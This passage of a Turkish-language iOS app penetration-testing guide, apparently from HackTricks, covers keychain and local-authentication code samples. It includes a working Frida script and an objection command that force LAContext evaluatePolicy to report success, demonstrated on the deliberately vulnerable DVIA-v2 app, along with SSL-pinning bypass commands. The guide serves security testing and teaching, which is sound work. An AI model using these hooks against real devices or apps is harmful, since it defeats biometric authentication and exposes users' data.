Kodda **hardcoded** ÅŸifreler/gizli bilgiler bulup bulamayacaÄŸÄ±nÄ±zÄ±, bunlarÄ±n **tahmin edilebilir** olup olmadÄ±ÄŸÄ±nÄ± ve kodun bazÄ± tÃ¼r **zayÄ±f** **kriptografi** algoritmalarÄ± kullanÄ±p kullanmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in ana kontrolleri gerÃ§ekleÅŸtirin.

BazÄ± **kriptografi** **kÃ¼tÃ¼phanelerini** otomatik olarak **objection** ile **izleyebileceÄŸinizi** bilmek ilginÃ§tir:
```swift
ios monitor crypt
```
For **daha fazla bilgi** iÃ§in iOS kriptografik API'leri ve kÃ¼tÃ¼phaneleri hakkÄ±nda [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography) adresini ziyaret edin.

## Yerel Kimlik DoÄŸrulama

**Yerel kimlik doÄŸrulama**, Ã¶zellikle uzaktan bir uÃ§ noktada kriptografik yÃ¶ntemlerle eriÅŸimi koruma sÃ¶z konusu olduÄŸunda kritik bir rol oynar. Buradaki Ã¶z, uygun bir uygulama olmadan yerel kimlik doÄŸrulama mekanizmalarÄ±nÄ±n aÅŸÄ±labileceÄŸidir.

Apple'Ä±n [**Yerel Kimlik DoÄŸrulama Ã§erÃ§evesi**](https://developer.apple.com/documentation/localauthentication) ve [**anahtar zinciri**](https://developer.apple.com/library/content/documentation/Security/Conceptual/keychainServConcepts/01introduction/introduction.html), geliÅŸtiricilerin kullanÄ±cÄ± kimlik doÄŸrulama diyaloglarÄ±nÄ± kolaylaÅŸtÄ±rmalarÄ± ve gizli verileri gÃ¼venli bir ÅŸekilde yÃ¶netmeleri iÃ§in saÄŸlam API'ler sunar. Secure Enclave, Touch ID iÃ§in parmak izi kimliÄŸini gÃ¼vence altÄ±na alÄ±rken, Face ID biyometrik verileri tehlikeye atmadan yÃ¼z tanÄ±maya dayanÄ±r.

Touch ID/Face ID'yi entegre etmek iÃ§in geliÅŸtiricilerin iki API seÃ§eneÄŸi vardÄ±r:

* **`LocalAuthentication.framework`**: Biyometrik verilere eriÅŸim olmadan yÃ¼ksek seviyeli kullanÄ±cÄ± kimlik doÄŸrulamasÄ± iÃ§in.
* **`Security.framework`**: Biyometrik kimlik doÄŸrulamasÄ± ile gizli verileri gÃ¼vence altÄ±na alarak daha dÃ¼ÅŸÃ¼k seviyeli anahtar zinciri hizmetlerine eriÅŸim iÃ§in. Ã‡eÅŸitli [aÃ§Ä±k kaynaklÄ± sarmalayÄ±cÄ±lar](https://www.raywenderlich.com/147308/secure-ios-user-data-keychain-touch-id) anahtar zinciri eriÅŸimini daha basit hale getirir.

{% hint style="danger" %}
Ancak, hem `LocalAuthentication.framework` hem de `Security.framework` zafiyetler sunar, Ã§Ã¼nkÃ¼ esasen kimlik doÄŸrulama sÃ¼reÃ§leri iÃ§in veri iletmeden boolean deÄŸerleri dÃ¶ndÃ¼rÃ¼rler, bu da onlarÄ± aÅŸÄ±labilir hale getirir (bkz. [Bana bÃ¶yle dokunma, David Lindner ve diÄŸerleri](https://www.youtube.com/watch?v=XhXIHVGCFFM)).
{% endhint %}

### Yerel Kimlik DoÄŸrulama UygulamasÄ±

KullanÄ±cÄ±lardan kimlik doÄŸrulama istemek iÃ§in geliÅŸtiricilerin **`LAContext`** sÄ±nÄ±fÄ±ndaki **`evaluatePolicy`** yÃ¶ntemini kullanmalarÄ± gerekir ve ÅŸu seÃ§eneklerden birini seÃ§melidirler:

* **`deviceOwnerAuthentication`**: Touch ID veya cihaz ÅŸifresi iÃ§in istemde bulunur, ikisi de etkin deÄŸilse baÅŸarÄ±sÄ±z olur.
* **`deviceOwnerAuthenticationWithBiometrics`**: Sadece Touch ID iÃ§in istemde bulunur.

BaÅŸarÄ±lÄ± bir kimlik doÄŸrulama, **`evaluatePolicy`** yÃ¶nteminden dÃ¶nen boolean bir deÄŸerle gÃ¶sterilir ve bu potansiyel bir gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± vurgular.

### Anahtar Zinciri Kullanarak Yerel Kimlik DoÄŸrulama

iOS uygulamalarÄ±nda **yerel kimlik doÄŸrulama** uygulamak, kimlik doÄŸrulama token'larÄ± gibi gizli verileri gÃ¼venli bir ÅŸekilde depolamak iÃ§in **anahtar zinciri API'lerini** kullanmayÄ± iÃ§erir. Bu sÃ¼reÃ§, verilerin yalnÄ±zca kullanÄ±cÄ±nÄ±n cihaz ÅŸifresi veya Touch ID gibi biyometrik kimlik doÄŸrulama ile eriÅŸilebileceÄŸini garanti eder.

Anahtar zinciri, kullanÄ±cÄ± baÅŸarÄ±lÄ± bir ÅŸekilde Touch ID veya cihaz ÅŸifresi ile kimlik doÄŸrulamasÄ± yapana kadar Ã¶ÄŸeye eriÅŸimi kÄ±sÄ±tlayan `SecAccessControl` niteliÄŸi ile Ã¶ÄŸeleri ayarlama yeteneÄŸi sunar. Bu Ã¶zellik, gÃ¼venliÄŸi artÄ±rmak iÃ§in kritik Ã¶neme sahiptir.

AÅŸaÄŸÄ±da, bu gÃ¼venlik Ã¶zelliklerini kullanarak anahtar zincirine bir dizeyi nasÄ±l kaydedip alacaÄŸÄ±nÄ±zÄ± gÃ¶steren Swift ve Objective-C'de kod Ã¶rnekleri bulunmaktadÄ±r. Ã–rnekler, eriÅŸim kontrolÃ¼nÃ¼ ayarlamanÄ±n nasÄ±l yapÄ±lacaÄŸÄ±nÄ±, Touch ID kimlik doÄŸrulamasÄ± gerektirecek ÅŸekilde ve verilerin yalnÄ±zca ayarlandÄ±ÄŸÄ± cihazda eriÅŸilebilir olmasÄ±nÄ± saÄŸlamak iÃ§in cihaz ÅŸifresinin yapÄ±landÄ±rÄ±lmasÄ± koÅŸuluyla gÃ¶stermektedir.

{% tabs %}
{% tab title="Swift" %}
```swift
// From https://github.com/mufambisi/owasp-mstg/blob/master/Document/0x06f-Testing-Local-Authentication.md

// 1. create AccessControl object that will represent authentication settings

var error: Unmanaged<CFError>?

guard let accessControl = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
SecAccessControlCreateFlags.biometryCurrentSet,
&error) else {
// failed to create AccessControl object

return
}

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute

var query: [String: Any] = [:]

query[kSecClass as String] = kSecClassGenericPassword
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecAttrAccount as String] = "OWASP Account" as CFString
query[kSecValueData as String] = "test_strong_password".data(using: .utf8)! as CFData
query[kSecAttrAccessControl as String] = accessControl

// 3. save item

let status = SecItemAdd(query as CFDictionary, nil)

if status == noErr {
// successfully saved
} else {
// error while saving
}
```
{% endtab %}

{% tab title="Objective-C" %}
```objectivec
// 1. create AccessControl object that will represent authentication settings
CFErrorRef *err = nil;

SecAccessControlRef sacRef = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
kSecAccessControlUserPresence,
err);

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute
NSDictionary* query = @{
(_ _bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecAttrAccount: @"OWASP Account",
(__bridge id)kSecValueData: [@"test_strong_password" dataUsingEncoding:NSUTF8StringEncoding],
(__bridge id)kSecAttrAccessControl: (__bridge_transfer id)sacRef
};

// 3. save item
OSStatus status = SecItemAdd((__bridge CFDictionaryRef)query, nil);

if (status == noErr) {
// successfully saved
} else {
// error while saving
}
```
{% endtab %}
{% endtabs %}

ArtÄ±k anahtarlÄ±kta kaydedilen Ã¶ÄŸeyi talep edebiliriz. AnahtarlÄ±k hizmetleri, kullanÄ±cÄ±ya kimlik doÄŸrulama penceresini gÃ¶sterecek ve uygun bir parmak izi saÄŸlanÄ±p saÄŸlanmadÄ±ÄŸÄ±na baÄŸlÄ± olarak veriyi veya nil dÃ¶ndÃ¼recektir.

{% tabs %}
{% tab title="Swift" %}
```swift
// 1. define query
var query = [String: Any]()
query[kSecClass as String] = kSecClassGenericPassword
query[kSecReturnData as String] = kCFBooleanTrue
query[kSecAttrAccount as String] = "My Name" as CFString
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecUseOperationPrompt as String] = "Please, pass authorisation to enter this area" as CFString

// 2. get item
var queryResult: AnyObject?
let status = withUnsafeMutablePointer(to: &queryResult) {
SecItemCopyMatching(query as CFDictionary, UnsafeMutablePointer($0))
}

if status == noErr {
let password = String(data: queryResult as! Data, encoding: .utf8)!
// successfully received password
} else {
// authorization not passed
}
```
{% endtab %}

{% tab title="Objective-C" %}
```objectivec
// 1. define query
NSDictionary *query = @{(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecAttrAccount: @"My Name1",
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecUseOperationPrompt: @"Please, pass authorisation to enter this area" };

// 2. get item
CFTypeRef queryResult = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, &queryResult);

if (status == noErr){
NSData* resultData = ( __bridge_transfer NSData* )queryResult;
NSString* password = [[NSString alloc] initWithData:resultData encoding:NSUTF8StringEncoding];
NSLog(@"%@", password);
} else {
NSLog(@"Something went wrong");
}
```
{% endtab %}
{% endtabs %}

### Tespit

Bir uygulamadaki frameworklerin kullanÄ±mÄ±, uygulama ikilisinin paylaÅŸÄ±lan dinamik kÃ¼tÃ¼phaneler listesinin analiz edilmesiyle de tespit edilebilir. Bu, `otool` kullanÄ±larak yapÄ±labilir:
```bash
$ otool -L <AppName>.app/<AppName>
```
EÄŸer bir uygulamada `LocalAuthentication.framework` kullanÄ±lÄ±yorsa, Ã§Ä±ktÄ± aÅŸaÄŸÄ±daki iki satÄ±rÄ± da iÃ§erecektir (unutmayÄ±n ki `LocalAuthentication.framework` arka planda `Security.framework` kullanÄ±r):
```bash
/System/Library/Frameworks/LocalAuthentication.framework/LocalAuthentication
/System/Library/Frameworks/Security.framework/Security
```
EÄŸer `Security.framework` kullanÄ±lÄ±yorsa, yalnÄ±zca ikincisi gÃ¶sterilecektir.

### Yerel Kimlik DoÄŸrulama Ã‡erÃ§evesi Atlatma

#### **Objection**

**Objection Biyometrik Atlatma** aracÄ±lÄ±ÄŸÄ±yla, [bu GitHub sayfasÄ±nda](https://github.com/sensepost/objection/wiki/Understanding-the-iOS-Biometrics-Bypass) bulunan bir teknik, **LocalAuthentication** mekanizmasÄ±nÄ± aÅŸmak iÃ§in mevcuttur. Bu yaklaÅŸÄ±mÄ±n temeli, `evaluatePolicy` fonksiyonunu manipÃ¼le etmek iÃ§in **Frida** kullanmaktÄ±r; bu sayede, gerÃ§ek kimlik doÄŸrulama baÅŸarÄ±sÄ±ndan baÄŸÄ±msÄ±z olarak sÃ¼rekli olarak `True` sonucu elde edilir. Bu, hatalÄ± biyometrik kimlik doÄŸrulama sÃ¼reÃ§lerini atlatmak iÃ§in Ã¶zellikle yararlÄ±dÄ±r.

Bu atlatmayÄ± etkinleÅŸtirmek iÃ§in aÅŸaÄŸÄ±daki komut kullanÄ±lÄ±r:
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios ui biometrics_bypass
(agent) Registering job 3mhtws9x47q. Type: ios-biometrics-disable
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # (agent) [3mhtws9x47q] Localized Reason for auth requirement: Please authenticate yourself
(agent) [3mhtws9x47q] OS authentication response: false
(agent) [3mhtws9x47q] Marking OS response as True instead
(agent) [3mhtws9x47q] Biometrics bypass hook complete
```
Bu komut, Objection'Ä±n `evaluatePolicy` kontrolÃ¼nÃ¼n sonucunu `True` olarak etkili bir ÅŸekilde deÄŸiÅŸtiren bir gÃ¶revi kaydettiÄŸi bir dizi baÅŸlatÄ±r.

#### Frida

**`evaluatePolicy`** kullanÄ±mÄ±na bir Ã¶rnek [DVIA-v2 uygulamasÄ±ndan](https://github.com/prateek147/DVIA-v2):
```swift
+(void)authenticateWithTouchID {
LAContext *myContext = [[LAContext alloc] init];
NSError *authError = nil;
NSString *myLocalizedReasonString = @"Please authenticate yourself";

if ([myContext canEvaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics error:&authError]) {
[myContext evaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics
localizedReason:myLocalizedReasonString
reply:^(BOOL success, NSError *error) {
if (success) {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Successful" withTitle:@"Success"];
});
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Failed !" withTitle:@"Error"];
});
}
}];
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Your device doesn't support Touch ID or you haven't configured Touch ID authentication on your device" withTitle:@"Error"];
});
}
}
```
Yerel Kimlik DoÄŸrulama'nÄ±n **bypass** edilmesi iÃ§in bir Frida scripti yazÄ±lmÄ±ÅŸtÄ±r. Bu script, **evaluatePolicy** kontrolÃ¼nÃ¼ hedef alÄ±r ve geri Ã§aÄŸrÄ±sÄ±nÄ± keserek **success=1** dÃ¶ndÃ¼rmesini saÄŸlar. Geri Ã§aÄŸrÄ±nÄ±n davranÄ±ÅŸÄ±nÄ± deÄŸiÅŸtirerek, kimlik doÄŸrulama kontrolÃ¼ etkili bir ÅŸekilde bypass edilir.

AÅŸaÄŸÄ±daki script, **evaluatePolicy** yÃ¶nteminin sonucunu deÄŸiÅŸtirmek iÃ§in enjekte edilir. Geri Ã§aÄŸrÄ±nÄ±n sonucunu her zaman baÅŸarÄ±yÄ± gÃ¶sterecek ÅŸekilde deÄŸiÅŸtirir.
```swift
// from https://securitycafe.ro/2022/09/05/mobile-pentesting-101-bypassing-biometric-authentication/
if(ObjC.available) {
console.log("Injecting...");
var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
Interceptor.attach(hook.implementation, {
onEnter: function(args) {
var block = new ObjC.Block(args[4]);
const callback = block.implementation;
block.implementation = function (error, value)  {

console.log("Changing the result value to true")
const result = callback(1, null);
return result;
};
},
});
} else {
console.log("Objective-C Runtime is not available!");
}
```
Frida betiÄŸini enjekte etmek ve biyometrik kimlik doÄŸrulamasÄ±nÄ± atlatmak iÃ§in aÅŸaÄŸÄ±daki komut kullanÄ±lÄ±r:
```bash
frida -U -f com.highaltitudehacks.DVIAswiftv2 --no-pause -l fingerprint-bypass-ios.js
```
## Hassas FonksiyonlarÄ±n IPC Ãœzerinden AÃ§Ä±ÄŸa Ã‡Ä±kmasÄ±

### Ã–zel URI Ä°ÅŸleyicileri / Derin BaÄŸlantÄ±lar / Ã–zel Åemalar

{% content-ref url="ios-custom-uri-handlers-deeplinks-custom-schemes.md" %}
[ios-custom-uri-handlers-deeplinks-custom-schemes.md](ios-custom-uri-handlers-deeplinks-custom-schemes.md)
{% endcontent-ref %}

### Evrensel BaÄŸlantÄ±lar

{% content-ref url="ios-universal-links.md" %}
[ios-universal-links.md](ios-universal-links.md)
{% endcontent-ref %}

### UIActivity PaylaÅŸÄ±mÄ±

{% content-ref url="ios-uiactivity-sharing.md" %}
[ios-uiactivity-sharing.md](ios-uiactivity-sharing.md)
{% endcontent-ref %}

### UIPasteboard

{% content-ref url="ios-uipasteboard.md" %}
[ios-uipasteboard.md](ios-uipasteboard.md)
{% endcontent-ref %}

### Uygulama UzantÄ±larÄ±

{% content-ref url="ios-app-extensions.md" %}
[ios-app-extensions.md](ios-app-extensions.md)
{% endcontent-ref %}

### Web GÃ¶rÃ¼nÃ¼mleri

{% content-ref url="ios-webviews.md" %}
[ios-webviews.md](ios-webviews.md)
{% endcontent-ref %}

### Seri Hale Getirme ve Kodlama

{% content-ref url="ios-serialisation-and-encoding.md" %}
[ios-serialisation-and-encoding.md](ios-serialisation-and-encoding.md)
{% endcontent-ref %}

## AÄŸ Ä°letiÅŸimi

**Åifreleme olmadan** iletiÅŸim gerÃ§ekleÅŸmediÄŸinden emin olmak ve ayrÄ±ca uygulamanÄ±n sunucunun **TLS sertifikasÄ±nÄ±** doÄŸru bir ÅŸekilde **doÄŸruladÄ±ÄŸÄ±ndan** emin olmak Ã¶nemlidir.\
Bu tÃ¼r sorunlarÄ± kontrol etmek iÃ§in **Burp** gibi bir proxy kullanabilirsiniz:

{% content-ref url="burp-configuration-for-ios.md" %}
[burp-configuration-for-ios.md](burp-configuration-for-ios.md)
{% endcontent-ref %}

### Host AdÄ± KontrolÃ¼

TLS sertifikasÄ±nÄ± doÄŸrularken yaygÄ±n bir sorun, sertifikanÄ±n **gÃ¼venilir** bir **CA** tarafÄ±ndan imzalanÄ±p imzalanmadÄ±ÄŸÄ±nÄ± kontrol etmektir, ancak **sertifikanÄ±n** **host adÄ±** ile eriÅŸilen host adÄ±nÄ±n kontrol edilmemesidir.\
Bu sorunu Burp kullanarak kontrol etmek iÃ§in, iPhone'da Burp CA'ya gÃ¼ven verdikten sonra, **farklÄ± bir host adÄ± iÃ§in Burp ile yeni bir sertifika oluÅŸturabilir** ve bunu kullanabilirsiniz. Uygulama hala Ã§alÄ±ÅŸÄ±yorsa, bir ÅŸeyin zayÄ±f noktasÄ± vardÄ±r.

### Sertifika Pinleme

Bir uygulama SSL Pinleme kullanÄ±yorsa, uygulama yalnÄ±zca beklenen sertifika ile Ã§alÄ±ÅŸÄ±r. Bir uygulamayÄ± test ederken **bu, Burp kendi sertifikasÄ±nÄ± sunacaÄŸÄ± iÃ§in bir sorun olabilir.**\
Jailbreak yapÄ±lmÄ±ÅŸ bir cihazda bu korumayÄ± aÅŸmak iÃ§in [**SSL Kill Switch**](https://github.com/nabla-c0d3/ssl-kill-switch2) uygulamasÄ±nÄ± yÃ¼kleyebilir veya [**Burp Mobile Assistant**](https://portswigger.net/burp/documentation/desktop/mobile/config-ios-device) yÃ¼kleyebilirsiniz.

AyrÄ±ca **objection'Ä±n** `ios sslpinning disable` komutunu da kullanabilirsiniz.

## Ã‡eÅŸitli

* **`/System/Library`** iÃ§inde sistem uygulamalarÄ± tarafÄ±ndan kullanÄ±lan telefonun kurulu Ã§erÃ§evelerini bulabilirsiniz.
* KullanÄ±cÄ± tarafÄ±ndan App Store'dan kurulan uygulamalar **`/User/Applications`** iÃ§inde yer alÄ±r.
* **`/User/Library`** kullanÄ±cÄ± dÃ¼zeyindeki uygulamalar tarafÄ±ndan kaydedilen verileri iÃ§erir.
* Uygulama iÃ§inde kaydedilen notlarÄ± okumak iÃ§in **`/User/Library/Notes/notes.sqlite`** dosyasÄ±na eriÅŸebilirsiniz.
* Kurulu bir uygulamanÄ±n klasÃ¶rÃ¼ iÃ§inde (**`/User/Applications/<APP ID>/`**) bazÄ± ilginÃ§ dosyalar bulabilirsiniz:
* **`iTunesArtwork`**: Uygulama tarafÄ±ndan kullanÄ±lan simge
* **`iTunesMetadata.plist`**: App Store'da kullanÄ±lan uygulama bilgileri
* **`/Library/*`**: Tercihleri ve Ã¶nbelleÄŸi iÃ§erir. **`/Library/Cache/Snapshots/*`** iÃ§inde uygulamaya arka plana gÃ¶nderilmeden Ã¶nce yapÄ±lan anlÄ±k gÃ¶rÃ¼ntÃ¼yÃ¼ bulabilirsiniz.

### SÄ±cak YamanÄ±n/Zorunlu GÃ¼ncellemenin

GeliÅŸtiriciler, uygulamalarÄ±nÄ±n tÃ¼m kurulumlarÄ±nÄ± anÄ±nda **yamanlayabilir** ve uygulamayÄ± App Store'a yeniden gÃ¶ndermeye gerek kalmadan onay bekleyebilirler.\
Bu amaÃ§la genellikle [**JSPatch**](https://github.com/bang590/JSPatch)** kullanÄ±lÄ±r.** Ancak [Siren](https://github.com/ArtSabintsev/Siren) ve [react-native-appstore-version-checker](https://www.npmjs.com/package/react-native-appstore-version-checker) gibi diÄŸer seÃ§enekler de vardÄ±r.\
**Bu, kÃ¶tÃ¼ niyetli Ã¼Ã§Ã¼ncÃ¼ taraf SDK'lar tarafÄ±ndan kÃ¶tÃ¼ye kullanÄ±labilecek tehlikeli bir mekanizmadÄ±r, bu nedenle otomatik gÃ¼ncelleme yÃ¶nteminin (varsa) hangi yÃ¶ntemle kullanÄ±ldÄ±ÄŸÄ±nÄ± kontrol etmek ve test etmek Ã¶nerilir.** Bu amaÃ§la uygulamanÄ±n Ã¶nceki bir sÃ¼rÃ¼mÃ¼nÃ¼ indirmeyi deneyebilirsiniz.

### ÃœÃ§Ã¼ncÃ¼ Taraflar

**3. taraf SDK'lar** ile ilgili Ã¶nemli bir zorluk, **fonksiyonlarÄ± Ã¼zerinde ayrÄ±ntÄ±lÄ± kontrol eksikliÄŸidir.** GeliÅŸtiriciler, SDK'yÄ± entegre etme ve potansiyel gÃ¼venlik aÃ§Ä±klarÄ± ve gizlilik endiÅŸeleri dahil olmak Ã¼zere tÃ¼m Ã¶zelliklerini kabul etme veya tamamen faydalarÄ±ndan vazgeÃ§me seÃ§eneÄŸi ile karÅŸÄ± karÅŸÄ±yadÄ±r. Genellikle, geliÅŸtiriciler bu SDK'lar iÃ§indeki zayÄ±f noktalarÄ± kendileri yamalayamazlar. AyrÄ±ca, SDK'lar topluluk iÃ§inde gÃ¼ven kazandÄ±kÃ§a, bazÄ±larÄ± kÃ¶tÃ¼ amaÃ§lÄ± yazÄ±lÄ±m iÃ§ermeye baÅŸlayabilir.

ÃœÃ§Ã¼ncÃ¼ taraf SDK'lar tarafÄ±ndan saÄŸlanan hizmetler, kullanÄ±cÄ± davranÄ±ÅŸÄ±nÄ± izleme, reklam gÃ¶sterimleri veya kullanÄ±cÄ± deneyimi iyileÅŸtirmeleri iÃ§erebilir. Ancak, bu, geliÅŸtiricilerin bu kÃ¼tÃ¼phaneler tarafÄ±ndan yÃ¼rÃ¼tÃ¼len kodun tam olarak farkÄ±nda olmamasÄ± nedeniyle potansiyel gizlilik ve gÃ¼venlik riskleri oluÅŸturur. ÃœÃ§Ã¼ncÃ¼ taraf hizmetlerle paylaÅŸÄ±lan bilgilerin, gerekli olanla sÄ±nÄ±rlÄ± olmasÄ± ve hassas verilerin aÃ§Ä±ÄŸa Ã§Ä±kmadÄ±ÄŸÄ±ndan emin olunmasÄ± Ã¶nemlidir.

ÃœÃ§Ã¼ncÃ¼ taraf hizmetlerin uygulanmasÄ± genellikle iki biÃ§imde gelir: baÄŸÄ±msÄ±z bir kÃ¼tÃ¼phane veya tam bir SDK. KullanÄ±cÄ± gizliliÄŸini korumak iÃ§in, bu hizmetlerle paylaÅŸÄ±lan verilerin **anonimleÅŸtirilmesi** gerekmektedir, bÃ¶ylece KiÅŸisel TanÄ±mlanabilir Bilgilerin (PII) ifÅŸasÄ± Ã¶nlenir.

Bir uygulamanÄ±n kullandÄ±ÄŸÄ± kÃ¼tÃ¼phaneleri belirlemek iÃ§in **`otool`** komutu kullanÄ±labilir. Bu araÃ§, uygulama ve kullandÄ±ÄŸÄ± her paylaÅŸÄ±lan kÃ¼tÃ¼phane Ã¼zerinde Ã§alÄ±ÅŸtÄ±rÄ±lmalÄ±dÄ±r, bÃ¶ylece ek kÃ¼tÃ¼phaneler keÅŸfedilebilir.
```bash
otool -L <application_path>
```
## **Referanslar ve Daha Fazla Kaynak**

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering)
* [iOS & Mobil Uygulama Pentesting - INE](https://my.ine.com/CyberSecurity/courses/089d060b/ios-mobile-app-pentesting)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/)
* [https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage](https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage)
* [https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way](https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060)
* [https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/](https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064](https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064)
* [https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc](https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054)
* [https://github.com/ivRodriguezCA/RE-iOS-Apps/](https://github.com/ivRodriguezCA/RE-iOS-Apps/) IOS Ã¼cretsiz kurs([https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/](https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/))
* [https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577](https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577)
* [https://www.slideshare.net/RyanISI/ios-appsecurityminicourse](https://www.slideshare.net/RyanISI/ios-appsecurityminicourse)
* [https://github.com/prateek147/DVIA](https://github.com/prateek147/DVIA)
* [https://github.com/prateek147/DVIA-v2](https://github.com/prateek147/DVIA-v2)
* [https://github.com/OWASP/MSTG-Hacking-Playground%20](https://github.com/OWASP/MSTG-Hacking-Playground)
* OWASP iGoat [_https://github.com/OWASP/igoat_](https://github.com/OWASP/igoat) <<< Objective-C versiyonu [_https://github.com/OWASP/iGoat-Swift_](https://github.com/OWASP/iGoat-Swift) <<< Swift versiyonu
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/nabla-c0d3/ssl-kill-switch2](https://github.com/nabla-c0d3/ssl-kill-switch2)

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=ios-pentesting) kullanarak dÃ¼nyanÄ±n **en geliÅŸmiÅŸ** topluluk araÃ§larÄ±yla desteklenen **iÅŸ akÄ±ÅŸlarÄ±nÄ±** kolayca oluÅŸturun ve **otomatikleÅŸtirin**.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=ios-pentesting" %}
{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** bizi takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
</details>
{% endhint %}
